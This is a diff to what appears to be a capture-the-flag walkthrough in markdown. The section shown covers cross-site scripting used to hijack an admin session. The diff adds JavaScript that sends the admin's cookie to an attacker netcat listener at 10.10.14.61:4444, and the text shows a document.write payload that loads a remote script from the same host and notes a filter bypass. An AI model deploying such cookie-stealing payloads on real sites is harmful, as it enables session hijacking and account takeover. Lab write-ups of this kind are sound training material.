@@ -190,10 +190,13 @@ Now the filtering rules have removed the single quotation marks inside our scrip
 
 ## Spoofing Admin Session
 
-The way we want to do this is to force script tags which connect to an external custom script onto the HTML of this webpage, this external custom script should force the admin to make a POST request to our netcat listener so we can extract the session data.  Below shows a simple javascript that waits for the page to load then sends the request with the cookie to our IP using the port netcat will listen on.
+The way we want to do this is to force script tags which connect to an external custom script onto the HTML of this webpage, this external custom script should force the admin to make a POST request to our netcat listener so we can extract the session data.  Below shows a simple javascript that waits for the page to load then sends the request with the cookie to our IP using the port netcat will listen on, remember to change it to your IP if using it.
 
 ``
-session.js
+window.addEventListener('DOMContentLoaded', function(e) 
+{
+    window.location = "http://10.10.14.61:4444/?cookie=" + document.getElementsByName("cookie")[0].value
+})
 ``
 
 A method for getting our custom externally hosted script to execute on the webpage is to use the ``document.write('<script src="http://10.10.14.61/session.js"></script>');`` javascript function with a string that calls our hosted script, but we have already determined that the string format is broken by the filtering rules. We can bypass this however by using two handy javascript functions. 
